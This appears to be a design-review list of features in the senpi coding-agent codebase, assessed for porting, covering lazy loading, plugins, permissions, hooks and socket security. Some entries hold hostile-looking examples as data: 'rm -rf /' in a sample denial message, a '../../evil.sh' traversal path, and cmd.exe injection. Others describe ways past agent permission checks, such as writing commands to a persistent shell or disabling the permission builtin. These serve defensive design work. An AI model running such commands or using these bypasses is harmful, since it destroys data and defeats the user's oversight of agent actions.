- **where:** packages/ai/src/api/lazy.ts + 11 *.lazy.ts siblings; capabilities include fetchDeferred/cancelDeferred for deferred responses
- **what:** Each wire protocol is behind a `.lazy.ts` sibling and loads on first stream call via `lazyApi(load, capabilities)`, which returns a synchronous stream while running async auth resolution and module loading behind it. Setup failures terminate the stream with a proper error assistant message rather than throwing synchronously.
- **how:** `LazyAssistantMessageEventStream` forwards from the inner async iterator, and `iterator.return?.()` is wired to a cancellation handler so cancellation propagates through the lazy boundary.
- **solves:** Loading 14 wire implementations (one is 166KB of source) at startup for a session that uses one.
- **port effort:** LOW-MEDIUM. The pattern itself is clean and omp already has an equivalent discipline (the AGENTS.md worker-host contract). | **idea only:** True

## senpi.75 Bun-vs-Node fetch split with a testable install decision

- **where:** packages/coding-agent/src/core/http-dispatcher.ts
- **what:** One `configureHttpDispatcher` installs an `undici.EnvHttpProxyAgent` global dispatcher, but deliberately does NOT replace global fetch under Bun. `shouldInstallUndiciGlobals` takes its four inputs as an injected struct so the decision is unit-testable per runtime, and it preserves a caller's deliberate post-load fetch override.
- **how:** Checks `process.versions.bun !== undefined` -> false. Rationale in-comment: the CLI's inlined npm undici on Bun 1.3.x returns headers but never delivers a streamed body, stalling every SSE response (#1890); Bun's native fetch honors HTTP_PROXY/HTTPS_PROXY/NO_PROXY and its stalls are already bounded by agent-level idle guards.
- **solves:** Swapping in undici on Bun to unify the dispatcher silently breaks all streaming. The tradeoff is subtle enough that it needs to be a tested pure function, not an `if`.
- **port effort:** LOW. Directly relevant — omp is Bun-first. The bug report and reasoning port as-is. | **idea only:** True

## senpi.76 PTY-backed persistent terminal as a separate extension from one-shot bash

- **where:** packages/coding-agent/src/core/tools/bash.ts (513 lines) vs builtin/terminal/ (pty.lazy.ts, monitor-registry.ts 30KB, terminal-manifest.ts, restore.ts, orphan-reaper.ts)
- **what:** The built-in `bash` tool is one-shot: a fresh `spawn(shell, [...args, command])` per call, with explicit handling of the fact that the shell exits while its children keep running. Persistent execution lives in a *separate* `terminal` extension registering 6 tools (bash, bash_output, bash_input, bash_resize, kill_bash, monitor) over a PTY.
- **how:** terminal is registered *after* `bash-timeout` (so the resolved default timeout reaches PTY bash) and after `anthropic-bash` (so a native Anthropic bash tool makes terminal step aside) — ordering comments in builtin/index.ts explain each. Durable state: lease files, a manifest writer with debounced checkpoints, MAX_DURABLE_MONITORS 5, 7-day expiry, an orphan reaper.
- **solves:** Persistent shells survive across turns and reloads without leaking PTY processes, and the two execution models do not fight over tool registration.
- **port effort:** MEDIUM-HIGH. omp already has `packages/natives` (Rust) and its own bash; the durable-monitor/orphan-reaper layer is the novel part. Idea-only. | **idea only:** True

## senpi.77 Code-mode polyglot kernels (jl / js / py / rb) behind an HTTP bridge

- **where:** packages/senpi-codemode/ (bridge/, bridges/, kernels/{jl,js,py,rb}, interpreters/detect.ts, config/, tool/)
- **what:** A source-only extension package that runs code in language kernels (Julia, JS, Python, Ruby) rather than shelling out per call, with an HTTP bridge, a kernel-tools protocol, a memory protocol, schema bridging into the agent's tool schema, and detached-cell management.
- **how:** Runtime detection resolves the available kernel, then a long-lived session executes cells; results bridge back through schema-bridge.ts/schema-hint.ts. Per-session run budgets, foreground-window seconds, hard limits, max detached cells.
- **solves:** A `python3 -c` round-trip per data analysis pays interpreter startup and loses state between calls.
- **port effort:** HIGH. This is a whole product surface. omp has no counterpart package. Worth scoping before any port. | **idea only:** True

## senpi.78 Transport-neutral CBOR session protocol (pi-protocol / pi-client / pi-wire)

- **where:** packages/protocol/, packages/client/ ("framed CBOR bytes"), packages/chord/, packages/server/ (exports "." and "./unix")
- **what:** A transport-neutral CBOR framing protocol for remote sessions, split into a protocol package (types/codec), a client package, a `chord` composition runtime (services, replicated state, RPC, plugins), and a `server` package with unix-socket transport.
- **how:** Wire format is independent of transport; app-server adds websocket and unix-socket transports over the same protocol, plus a daemon with an occupancy server.
- **solves:** One session protocol usable over unix socket, websocket, or in-process without renegotiating the wire format.
- **port effort:** HIGH. omp has its own `packages/wire` (@oh-my-pi/pi-wire) already; compare formats before porting anything. | **idea only:** True

## senpi.79 Git as a pure URL parser plus spawn-based command wrappers

- **where:** packages/coding-agent/src/utils/git.ts; spawn sites in core/package-manager.ts, core/repository-identity.ts, beta/omo-local-update.ts, builtin/diff.ts
- **what:** `src/utils/git.ts` is 226 lines with exactly ONE export — `parseGitUrl`, built on `hosted-git-info`, handling scp-like (`git@host:path@ref`), https, and ref-suffixed forms, returning {repo, host, path, ref, pinned}. Everything else shells out to real git.
- **how:** `diff.ts` uses `pi.exec("git", ["status","--porcelain"])` and `git difftool -y --tool=vscode <file>` to render diffs in the TUI. omo-local-update.ts drives worktree add/remove/prune for self-update.
- **solves:** Package sources can be `owner/repo@ref`, and pinning must be detectable so an auto-updater knows not to move a pinned dep.
- **port effort:** LOW for the parser; N/A for the rest. omp's AGENTS.md mandates `@oh-my-pi/pi-natives/vcs` as the only sanctioned git path, so the spawn sites should NOT be ported — only the URL-parsing semantics. | **idea only:** True

## senpi.80 Platform browser launcher with an explicit Windows injection fix

- **where:** packages/coding-agent/src/utils/open-browser.ts (24 lines)
- **what:** Opens a URL/file in the platform default handler via direct `spawn` (open / rundll32 / xdg-open), never a shell, and swallows launcher failure so a missing xdg-open cannot crash the process.
- **how:** Windows uses `rundll32 url.dll,FileProtocolHandler <target>` rather than `cmd /c start` — the comment explains cmd.exe re-parses metacharacters (&, |, ^) before `start` runs, making attacker-controlled URLs injectable.
- **solves:** Prevents argument injection through a user- or agent-supplied URL on Windows.
- **port effort:** VERY LOW. omp has `packages/browser-relay` (a real automation surface) — this is the complement, not the replacement. | **idea only:** False

## senpi.81 HTTP content extraction without a headless browser

- **where:** packages/coding-agent/src/core/extensions/builtin/webfetch/webfetch/ (fetcher.ts, content.ts, content.lazy.ts, parse-web-document.ts, renderers.ts, tool.ts)
- **what:** webfetch fetches over HTTP and converts to markdown with turndown + `@mozilla/readability`, declaring the browser build of turndown via a 137-byte ambient module. No DOM, no headless Chrome.
- **how:** content.lazy.ts defers the markdown stack; fetcher.ts owns the network and content.ts owns the conversion, separately.
- **solves:** Keeps web content on the cheap path; reserves a browser for pages that genuinely need rendering.
- **port effort:** LOW. omp's browser-relay covers the JS-rendering half that senpi simply omits — the two are complementary. | **idea only:** False

## senpi.82 Permission rule cascade with 9-level last-match-wins precedence

- **where:** packages/coding-agent/src/core/extensions/builtin/permission-system/settings.ts:41-49 (merge order), evaluate.ts:14-24 (findLast), config.ts:8-29 (preset table)
- **what:** Rules are concatenated in strict precedence order and resolved with findLast: default preset -> global preset -> global rules -> project preset -> project rules -> CLI preset -> CLI flags -> session approvals. Non-full-access presets begin with a `*=ask` mask rule so they shadow lower-precedence wildcard allows before adding their own.
- **how:** settings.ts calls merge(rulesForPreset(DEFAULT_PERMISSION_PRESET), globalPreset, globalRules, projectPreset, projectRules, cliPreset, cliOverride) producing one flat Ruleset; service.ts:40 calls evaluate(perm, pattern, this.staticRuleset, this.approved) and evaluate flat()s + findLast()s.
- **solves:** Gives one auditable place to answer "why did this tool call get through", and lets a coarse global policy be tightened by a finer project or CLI policy without editing the global file. The `*=ask` mask is the non-obvious part: it is what stops a later restrictive preset from being shadowed by a wildcard allow earlier in the concatenated list.
- **port effort:** Medium. The cascade shape is portable; the Action enum, tool-name permission classes, and preset names are all senpi-specific and must be re-derived. | **idea only:** True

## senpi.83 Tool-aware permission parser registry

- **where:** packages/coding-agent/src/core/extensions/builtin/permission-system/parsers.ts:125-285 (createBuiltinParserRegistry), arity.ts (BashArity.prefix)
- **what:** Instead of one generic tool permission, each tool's input is parsed to extract the semantically meaningful argument: bash -> command prefix via BashArity; edit/write/apply_patch/multiedit -> the target file path, or every path extracted from an apply_patch body; grep -> search path or pattern; list/find/ls -> directory; read -> file path. Tools with no registered parser fall back to a single patterns:['*'] request named after the tool.
- **how:** A ParserRegistry maps toolName -> ToolPermissionParser(input, cwd) -> PermissionRequest[]. The extension checks parserRegistry.has(toolName) first, then falls back to the tool's OWN declared permissionParser via toolOwnedPermissionRequests(), then to the wildcard (index.ts:107-110), so a third-party extension can supply a precise parser for its own tool.
- **solves:** Without this, 'always allow' degrades to a blanket tool grant. With it, approving one file does not approve the whole edit tool, and approving `git status` does not approve `rm`. It is the single highest-leverage idea in the whole permission design.
- **port effort:** Medium. The registry shape ports directly; BashArity's prefix taxonomy and the patch-body path extractor (extractPatchedPaths, which imports from the gpt-apply-patch builtin) are senpi-specific. | **idea only:** True

## senpi.84 bash_input classified into the same bash permission class

- **where:** packages/coding-agent/src/core/extensions/builtin/permission-system/parsers.ts:128-164, with the rationale written inline at lines 128-131
- **what:** The persistent-shell write tool `bash_input` is registered through the SAME parseBashLikePermission('input') as `bash`, so a write to a live shell stdin is gated by the same `bash` rules rather than by a tool-named fallback.
- **how:** registry.register('bash', parseBashLikePermission('command')); registry.register('bash_input', parseBashLikePermission('input'));
- **solves:** Closes a real bypass: a read-only or ask preset would otherwise be defeated by opening a PTY once and then writing arbitrary commands to its stdin, each write carrying only the small `bash_input` permission. The steering/read tools (bash_output/kill_bash/bash_resize) deliberately do NOT get this treatment because they cannot execute.
- **port effort:** Low as a rule; high as a checklist item. Any port with a persistent-shell tool must classify its write path into the exec class, and the reasoning must be written down or it will be 'simplified' away. | **idea only:** True

## senpi.85 external_directory as a separate permission class

- **where:** packages/coding-agent/src/core/extensions/builtin/permission-system/external-dir.ts:21-36 (isExternalPath), parsers.ts:64-83 (withExternalDirectoryRequests), config.ts:17,26 (preset entries)
- **what:** Any tool target that resolves outside the repo root raises an ADDITIONAL permission request with permission='external_directory', on top of the tool's own edit/read/list/grep class. The 'workspace' and 'read-only' presets both set external_directory to 'ask'.
- **how:** For bash, extractExternalPaths() tokenizes the command with quote/escape awareness, filters out flags/env-assignments/shell-metachar tokens via looksLikePath(), and classifies the remainder. For edits, the raw file paths are classified directly. 'Always' scope differs by tool: file tools persist the exact path, grep/list persist the directory.
- **solves:** Makes 'confined to the workspace' a first-class, separately-approvable property rather than a side effect of path prefix matching. Crucially it uses realpathWithoutOpen — a realpath(3) emulation that walks lstat/readlink per component and never calls open(2), because a realpath on an autofs trigger blocks forever and on an execute-only dir raises EACCES (see utils/changes.md:119 and the inline comment at external-dir.ts:23-24).
- **port effort:** Medium. The realpath-without-open walker is the part worth stealing verbatim; the bash tokenizer is a best-effort heuristic that will always be defeatable by an obfuscated command. | **idea only:** True

## senpi.86 Content-hash hook trust with scope separation

- **where:** packages/coding-agent/src/core/extensions/builtin/hooks/trust.ts:82-153 (hashCommandHook, isCommandHookTrusted, filterExecutableTrustedHooks), trust-storage.ts:127-135 (hookTrustStorageScope)
- **what:** Executable hooks are not trusted by path but by content hash. Trust is stored per-hook as trustedHash; a hook runs only when entry.trustedHash === the freshly computed hash of {event, command, platformCommand, statusMessage, timeout, matcher, sourceKeyHash}. Editing a hook's command automatically de-trusts it. Project-scope trust decisions are only storable when the project itself is trusted.
- **how:** hashCommandHook builds a canonical (key-sorted) JSON object and sha256s it with a `sha256:` prefix. buildStatefulHookTrustRecord computes `executable = enabled && trusted` and every execution path filters on that.
- **solves:** A hook file edited after approval — by a git pull, a malicious PR, or a compromised dependency — stops running without the user re-approving. A path-based trust cache would keep executing the new command.
- **port effort:** Medium. Fully portable; the main cost is the canonical-JSON helper and deciding the trust store's UX (senpi gates execution entirely rather than warning). | **idea only:** True

## senpi.87 Hook environment allowlist instead of inheritance

- **where:** packages/coding-agent/src/core/extensions/builtin/hooks/safety.ts:19-32 (MINIMAL_INHERITED_ENV), 63-83 (buildHookEnvironment)
- **what:** Hook subprocesses receive a 12-variable env allowlist (PATH, HOME, USER, USERNAME, LOGNAME, SHELL, TMPDIR, TMP, TEMP, SystemRoot, ComSpec, PATHEXT) plus an explicit opt-in passthrough list plus PLUGIN_ROOT/PLUGIN_DATA for plugins. Everything else in the parent env, including every API key, is dropped.
- **how:** buildHookEnvironment starts from an empty object and copies only allowlisted keys. The hook also learns its own provenance via SENPI_HOOK_SOURCE and SENPI_HOOK_EVENT.
- **solves:** A hook that is merely trusted-enough to run a formatter still cannot exfiltrate the user's ANTHROPIC_API_KEY or a GitHub token just by being on PATH-adjacent and inheriting the environment. This is the control that makes 'we trust this hook' a much smaller concession than it looks.
- **port effort:** Low. Small file, high value, no dependencies. | **idea only:** True

## senpi.88 Plugin command target containment, checked twice

- **where:** packages/coding-agent/src/core/extensions/builtin/hooks/safety.ts:85-148 (validateHookHandlerSafety, validateCommandField), 150-209 (extractPluginRootTargets, readCommandWords, isContained)
- **what:** For plugin-sourced hooks, any ${PLUGIN_ROOT}/$PLUGIN_ROOT/%PLUGIN_ROOT% token in the command is expanded and then checked for containment inside the plugin root lexically (relative() with no '..' and not absolute) AND again after realpathSync.native on both root and target, so a symlink pointing outside the root is caught even though the lexical check passed.
- **how:** readCommandWords is a small shell-aware tokenizer that strips quotes before inspecting words. Missing targets produce a `missing_command_target` diagnostic; escapes produce `invalid_command_target`.
- **solves:** Stops a plugin from declaring `command: "${PLUGIN_ROOT}/../../evil.sh"` or planting a symlink at `${PLUGIN_ROOT}/tool` that points at /bin/sh while the path itself still looks contained.
- **port effort:** Low-Medium. The double-check (lexical + post-realpath) is the reusable idea; the specific tokenizer is not. | **idea only:** True

## senpi.89 RPC daemon socket: 0600 + 32-byte secret + timing-safe handshake

- **where:** packages/coding-agent/src/modes/rpc/socket-transport.ts:1-95 (whole file), multi-session-host.ts:547-586 (prepareSocketPath, listen)
- **what:** The Unix RPC socket is created inside a 0700 dir, chmod'd to 0600 after listen, and guarded by a 32-byte random secret persisted at `<socket>.secret` with mode 0600 (and an explicit chmod to defeat a permissive umask). Clients must send the raw secret as the first bytes; the server compares with timingSafeEqual and destroys the socket on mismatch or on a 2s handshake timeout.
- **how:** ensureSocketSecret reuses a valid existing 32-byte file, else createSocketSecret writes a new one. authenticateSocket buffers until it has secret.length bytes, then timingSafeEqual, then socket.unshift(remainder) so client bytes arriving in the same packet are not swallowed. On win32 the secret is folded into the pipe name via sha256(canonicalPath+secret).slice(0,32).
- **solves:** 0600 alone still leaves the socket reachable by any process that can become the same user later, and on Windows there is no filesystem mode at all — so the secret makes the 'someone else on this box' case require reading a 0600 file, and the timing-safe compare avoids a byte-at-a-time oracle.
- **port effort:** Low. Roughly 95 lines, no dependencies beyond node:crypto and node:net. The unshift() remainder handling is the detail that is easy to get wrong and worth copying. | **idea only:** True

## senpi.90 Socket identity guard so shutdown removes only its own socket

- **where:** packages/coding-agent/src/modes/rpc/multi-session-host.ts:547-586
- **what:** Before unlinking a stale socket path, the host actively probes it: if a live server answers, startup ABORTS with 'address already in use by a live server' rather than stealing the path. After listen it records statSocketIdentity() and shutdown deletes the path only while that identity still matches.
- **how:** probeSocket() opens a connection with a 1s timeout; listen() resolves a SocketFileIdentity which the cleanup path compares before unlinking.
- **solves:** Two senpi instances racing on the same socket path, or a supervisor restarting a host while the old one is still draining, cannot end up with one process silently unlinking another's live socket out from under its clients.
- **port effort:** Low. The probe-before-unlink and identity-checked-cleanup pair is the whole idea. | **idea only:** True

## senpi.91 Single shared lockfile policy with a documented reason

- **where:** packages/coding-agent/src/core/lockfile-policy.ts:1-26, consumed by core/auth-storage.ts:35-42 and hooks/trust-storage.ts:132-159
- **what:** Every file-backed store (auth.json, hook trust state) acquires proper-lockfile locks through ONE exported constant instead of per-call options, because per-call divergence caused a real lock-theft bug. The comment records the exact arithmetic: proper-lockfile defaults to stale:10_000 refreshing mtime every stale/2, so a sync contender using the default can classify a live async lock as stale in the 10-15s gap and steal it.
- **how:** FILE_STORAGE_LOCK_OPTIONS = {realpath:false, stale:30_000, update:10_000, retries:0}; every acquisition passes retries:0 and runs its own bounded wait loop so an AbortSignal is observed between attempts rather than after the whole budget. Async budget 5.5s, sync budget 1.0s (sync callers block the TUI main thread). Contention surfaces as CredentialStoreBusyError naming the path and wait.
- **solves:** Lock theft under a default-heavy library, plus a bounded and user-legible failure instead of an unbounded hang or a silent retry storm. The retries:0 + own-loop split is what makes cancellation actually work.
- **port effort:** Low. One file; copy the reasoning comment verbatim into the port or the same bug returns. | **idea only:** True

## senpi.92 Atomic 0600 credential store write

- **where:** packages/coding-agent/src/core/auth-storage.ts:88-91 (AUTH_FILE_WRITE_OPTIONS), 125-160 (mkdir 0700 + atomic write)
- **what:** auth.json is never written in place. Every write stages a fresh 0600 temp file beside the store and renames it over the target, preserving the existing numeric mode when the store already exists, with a best-effort chmod and a comment that a stale temp is already 0600 so the failure path is safe.
- **how:** writeFileSync(temp, data, {mode:0o600}) then chmodSync(temp, existingMode & 0o777) then renameSync. Directory created with {recursive:true, mode:0o700}.
- **solves:** A crash or a full disk mid-write cannot leave a truncated or world-readable credentials file, and the rename is atomic so a concurrent reader sees either the old or the new content, never a partial one.
- **port effort:** Low. Standard technique, but senpi's version is unusually careful about the mode-preservation and leftover-temp cases. | **idea only:** True

## senpi.93 Project trust gate for config resources, defaulting to ask

- **where:** packages/coding-agent/src/core/trust-manager.ts:30-38, 195-217; core/project-trust.ts:46-96; settings-manager.ts:729-731 (project settings return {} when untrusted)
- **what:** A project directory is only trusted after a prompt (or an extension's project_trust event) when it actually contains trust-requiring resources: .senpi/settings.json, extensions/, skills/, prompts/, themes/, SYSTEM.md, APPEND_SYSTEM.md, or a .agents/skills dir in any parent up to the filesystem root. The setting is defaultProjectTrust with default 'ask', and is a GLOBAL-only setting so a project cannot relax its own gate. Headless modes with no UI resolve to false (do not trust).
- **how:** hasTrustRequiringProjectResources() walks cwd and then every parent; resolveProjectTrusted() short-circuits on an explicit override, then on !hasTrustRequiring..., then gives extensions a project_trust event first, then the store, then defaultProjectTrust, then the UI select. SettingsManager.loadFromStorage returns {} for scope 'project' when projectTrusted is false.
- **solves:** Cloning a repo does not silently execute its extensions or load its settings. The 'is there anything to trust?' early-out also means the common case of a plain repo never nags the user.
- **port effort:** Medium. The design is portable; the resource denylist is exactly where senpi's own bug lives (see findings), so a port MUST enumerate every config artifact that can grant capability, not just the ones that existed when the list was written. | **idea only:** True

## senpi.94 Extension system as the permission enforcement substrate

- **where:** packages/coding-agent/src/core/extensions/builtin/index.ts:65-70; permission-system/index.ts:75-175 (session_start / tool_call / session_shutdown)
- **what:** Permission enforcement is itself a builtin extension, registered 3rd in builtinExtensions, with loop-guard deliberately placed 1st ('so repeated calls never re-run hooks or permission prompts') and hooks 2nd ('so builtin command hooks can inspect tool calls before permission prompts').
- **how:** pi.on('tool_call', ...) returns {block:true, reason} to veto; loop-guard's veto short-circuits before the permission prompt so a stuck loop cannot spam the user with permission dialogs. Builtins are filterable via settings enabledBuiltinExtensions / disabledBuiltinExtensions without touching --no-extensions.
- **solves:** Makes the whole permission model inspectable and testable as an ordinary plugin, and lets a user disable or allowlist builtins the same way they would third-party ones — which is also the escape hatch for the two blocking defects (disabling permission-system, or setting disabledBuiltinExtensions, both work today).
- **port effort:** High. This is architectural, not a file to copy. It is the single most opinionated decision in the repo. | **idea only:** True

## senpi.95 Approval decision cascade for batched pending prompts

- **where:** packages/coding-agent/src/core/extensions/builtin/permission-system/service.ts:83-113, 136-166
- **what:** Answering one prompt correctly resolves or rejects the other pending prompts in the same session that the answer covers: 'always' auto-resolves any pending request whose every pattern now evaluates to allow, and 'reject' rejects all remaining pending requests in that session.
- **how:** resolveCoveredPendingInSession re-evaluates each pending entry against the updated approved list; rejectPendingInSession rejects all. Session-scoped, so a reject in one session does not cancel another's dialog.
- **solves:** A multi-file apply_patch or a script that writes 12 files otherwise queues 12 dialogs; answering the first one sensibly resolves the rest. It also guarantees that rejecting stops the remaining work rather than letting it proceed file by file.
- **port effort:** Medium. The idea ports; the per-session bookkeeping and the emitted permission_replied 'always' bookkeeping do not. | **idea only:** True

## senpi.96 Fail-closed websocket auth with explicit empty-token rejection

- **where:** packages/coding-agent/src/modes/app-server/transports/websocket-auth.ts:21-66; AGENTS.md invariant at modes/app-server/AGENTS.md:34
- **what:** The app-server refuses to start a listener when its bearer token resolves to empty, with the reason inline: an empty token would authorize any 'Authorization: Bearer ' request. Tokens are 32 random bytes hex written 0600; Origin requests stay rejected; listeners bind IP literals.
- **how:** resolveWebSocketAuth reads a token file, and if `token.length === 0` throws. A truncated auto-managed file (e.g. a crashed prior write) is treated as needing regeneration, not as an empty-but-valid token.
- **solves:** The classic 'auth is disabled because the secret file is empty' failure, where the server comes up wide open and reports itself as authenticated.
- **port effort:** Low. The empty-token check is three lines and the comment is the payload. | **idea only:** True

## senpi.97 Secret-answer redaction before crossing the process boundary

- **where:** packages/coding-agent/src/modes/app-server/server/approval-redaction.ts:1-26
- **what:** Approval/question payloads that can carry user secrets are redacted by question flag rather than by pattern matching: a question marked isSecret (or is_secret) has its answers replaced with [REDACTED] before the response is returned.
- **how:** readSecretQuestionIds collects flagged question ids from params; redactSecretAnswers maps only those ids through redactAnswer.
- **solves:** The app-server AGENTS.md explicitly warns that approval payloads and diagnostics can contain sensitive material and that diagnostics are NOT assumed redacted. Marking the secret at the source is more reliable than regex-scanning an arbitrary answer string after the fact.
- **port effort:** Low. The flag-at-source pattern is the idea; the generic regex redactor is the weaker complement. | **idea only:** True

## senpi.98 Crash and stray-stdout logging that cannot corrupt the TUI or leak secrets

- **where:** packages/coding-agent/src/core/hidden-stdout-log.ts:1-46; modes/interactive/interactive-stderr-guard.ts:6-70
- **what:** When the TUI is active, stray stdout and stderr are intercepted and written to a 0600 debug log after passing through the redactor, rather than being printed (which would corrupt rendering) or dropped (which would lose the evidence). Uncaught crashes get the same treatment via appendUncaughtCrashLog, whose contract is stated in the doc comment: writing telemetry may never alter the crash path, so callers must invoke it before terminal handoff and must swallow failure.
- **how:** appendDebugLogEntry does appendFileSync(...,{mode:0o600}) followed by an explicit chmodSync 0o600 (defeating a permissive umask), and redactSensitiveOutput(text) before writing.
- **solves:** Keeps the documented 'no console.* while the TUI is live' rule enforceable in library code that has no way to know whether a TUI is attached, and guarantees the resulting log is not a new secret-exfiltration surface.
- **port effort:** Low. The interception-plus-0600-plus-never-throw contract is the whole value. | **idea only:** True

## senpi.99 Permission observability events

- **where:** packages/coding-agent/src/core/extensions/builtin/permission-system/events.ts:1-124; wired at service.ts:57,77,90,143
- **what:** Every prompt decision emits permission_asked (the full Request, including toolName and parsed metadata) and permission_replied (requestID, sessionID, reply). The emitter is an interface with two implementations — pi.events for production and a local registry for tests.
- **how:** createEventEmitter(pi) wraps pi.events.emit; createLocalEventEmitter() returns an emitter with onAsked/onReplied/clear for tests. Both wrap each handler call in try/catch so a throwing subscriber cannot break the permission path.
- **solves:** Makes an approval decision reconstructable after the fact by correlating requestID across the two events, and lets extensions build an audit trail without patching the permission system.
- **port effort:** Low. Note that the local emitter's catch handlers use console.error, which is acceptable only on the test/standalone path. | **idea only:** True

## senpi.100 Non-interactive permission fallback

- **where:** packages/coding-agent/src/core/extensions/builtin/permission-system/non-interactive.ts:10-52
- **what:** With no UI (print/json/rpc modes), an 'ask' result is converted to a structured rejection whose message names the exact override the user needs: 'Permission required for bash (rm -rf /). Use --permission bash=allow to override.' The same message is fed back to the model so it can adapt rather than retry blindly.
- **how:** handleNoUI evaluates cliOverride first, then staticRuleset, then returns the reject with the guidance message. Denied and ask both produce reply:'reject', so the model cannot distinguish them by reply alone — only by message text.
- **solves:** Headless runs are deny-by-default rather than allow-by-default, and the failure is self-documenting instead of a bare 'permission denied'.
- **port effort:** Low. Port the fail-closed default; be aware the deny/ask distinction is only in the message (see findings). | **idea only:** True

## senpi.101 ExtensionFactory → ExtensionAPI registration

- **where:** src/core/extensions/types.ts:2365 (ExtensionFactory), :1907 (ExtensionAPI, 458 lines), loader.ts:891 loadExtensions
- **what:** A module default-exports `(pi: ExtensionAPI) => void | Promise<void>` and calls `pi.on(...)`, `pi.registerTool(...)`, `pi.registerCommand(...)` etc. during that call.
- **how:** Factory body runs once at load; every side effect is a registration into the per-extension `Extension` record's maps.
- **solves:** Single narrow entry contract so the host can treat first-party and third-party code identically.
- **port effort:** High — 44 events + 15 register methods is a large surface to re-express | **idea only:** True

## senpi.102 Builtins are plugins

- **where:** src/core/extensions/builtin/index.ts — 44 in `builtinExtensions` + 4 in `globalDefaultExtensionFactories`
- **what:** 48 builtin features (compaction, MCP, terminal, permissions, todo, goal, loop, rules...) are registered as `ExtensionFactory` in a plain array and loaded through the identical loader as user extensions.
- **how:** `builtinExtensions: BuiltinExtensionFactory[]` then fed into the same load path; `globalDefaultExtensionIds = ["diff","files","prompt-url-widget","tps"]` are user-disableable.
- **solves:** Removes the host/plugin privilege boundary entirely — first-party code has no privileged path, so the public API is exercised by the product itself.
- **port effort:** Very high — implies re-architecting features as plugins | **idea only:** True

## senpi.103 Three-name load-time module alias

- **where:** loader.ts:99-107 (virtualModules) and :200-219 (jiti aliases)
- **what:** Extensions written against any of `@code-yeongyu/senpi`, `@earendil-works/pi-coding-agent`, or legacy `@mariozechner/pi-coding-agent` all resolve to the same bundled entry; pi-tui/pi-ai/typebox are injected too.
- **how:** Static alias map → resolved bundled entry paths; also feeds Bun virtual modules in compiled binaries.
- **solves:** Renames the package without breaking published extensions; gives plugin authors the host's own libraries with no separate install.
- **port effort:** Low — an alias table is ~20 lines | **idea only:** False

## senpi.104 44-event lifecycle bus

- **where:** types.ts:1933-1992 (verified by extraction: 44 unique names)
- **what:** 44 distinct `.on()` events spanning session, provider-request, agent, turn, message, tool-execution, tool-call/result, input, and UI-prompt phases.
- **how:** Typed overloads; blocking events (tool_call, session_before_*) return results that short-circuit.
- **solves:** Lets extensions intercept every stage without the host knowing about them.
- **port effort:** High — the specific event set is senpi-shaped | **idea only:** True

## senpi.105 Provider registration (incl. OAuth + custom streamSimple)

- **where:** types.ts:2234-2250, ProviderConfig at :2274, ProviderModelConfig at :2331
- **what:** Extensions can register a whole provider with models, custom baseUrl/headers/extraBody, a custom `streamSimple` API handler, and an OAuth login/refresh/getApiKey triple.
- **how:** Queued pre-bind, applied on `bindCore()`, then immediate; `unregisterProvider` is the only true unregister on the API.
- **solves:** Makes the LLM backend itself pluggable — the deepest form of "everything is a plugin".
- **port effort:** High | **idea only:** True

## senpi.106 Declarative JSON+shell hooks subsystem

- **where:** src/core/extensions/builtin/hooks/ — 23 files, 4,663 LOC; plugin-loader.ts, plugin-manifest.ts, schema.ts, safety.ts
- **what:** A second plugin surface: hook manifests declaring shell commands bound to Claude-style events (PreToolUse, PostToolUse, UserPromptSubmit, SessionStart, Stop, SubagentStop, PostToolUseFailure).
- **how:** `loadPluginHookManifest` reads a plugin root, path-containment checks via `resolveContainedPath`, validates handler safety, produces diagnostics instead of throwing.
- **solves:** Lets non-programmers add automation with no JS, and keeps shell execution behind a safety validator.
- **port effort:** Medium | **idea only:** True

## senpi.107 Chord facet system with real disposal

- **where:** packages/chord (34 files, 9,379 LOC); types.ts:209-231 FacetEnvironment, api.ts:45-59 dispose chain; wired in src/experimental/plugins/bundled.ts
- **what:** An experimental DI/RPC facet system where facets declare service dependencies, own resources, and dispose deterministically in reverse load order.
- **how:** `env.own(disposal)`, `onActivate`, `onDeactivate`; `disposeLoadedFacets([...loaded].reverse())` collecting an `AggregateError`.
- **solves:** The disposal + dependency-ordering contract the TS extension API lacks — but see gaps, it is unreachable externally.
- **port effort:** High, and it needs its own process/transport story | **idea only:** True

## senpi.108 Config-driven hot reload

- **where:** builtin/config-reload/ (11 files); documented docs/extensions.md:2206-2213
- **what:** Builtin watches settings.json(c)/models.json/keybindings.json and trusted project `.senpi` surfaces; a real content change requests a full session reload when idle, deferring while busy/compacting, and honouring an extension veto via `session_before_reload`.
- **how:** Debounced filesystem watch in a `node:worker_threads` Worker; parseable files validated before reload so a bad edit keeps the running config.
- **solves:** Makes the plugin set editable without restarting — with graceful deferral instead of reload storms.
- **port effort:** Medium | **idea only:** True

## senpi.109 Command collision renaming

- **where:** runner.ts:1017-1051 resolveRegisteredCommands; interactive-mode.ts:1261-1274
- **what:** Two extensions registering the same slash command both stay invocable as `name:1` and `name:2`; collision against a built-in is reported as a warning and shadowed from autocomplete.
- **how:** Occurrence counting plus a taken-name set with an incrementing suffix loop.
- **solves:** Avoids last-writer-wins clobbering without needing a registry/priority model.
- **port effort:** Low | **idea only:** False

## senpi.110 Package manifest for multi-resource plugins

- **where:** src/core/pi-manifest.ts (RESOURCE_FIELDS); loader.ts:923-953 resolveExtensionEntries
- **what:** A `pi` field in package.json declares `extensions`, `skills`, `prompts`, `themes`, `hooks`, and a `system` flag; discovery also accepts a bare index.ts/index.js.
- **how:** `readPiManifest` parses and type-filters; directory discovery is non-recursive beyond one level unless a manifest is present.
- **solves:** Lets one npm/git package ship several resource kinds under a single install.
- **port effort:** Low | **idea only:** True

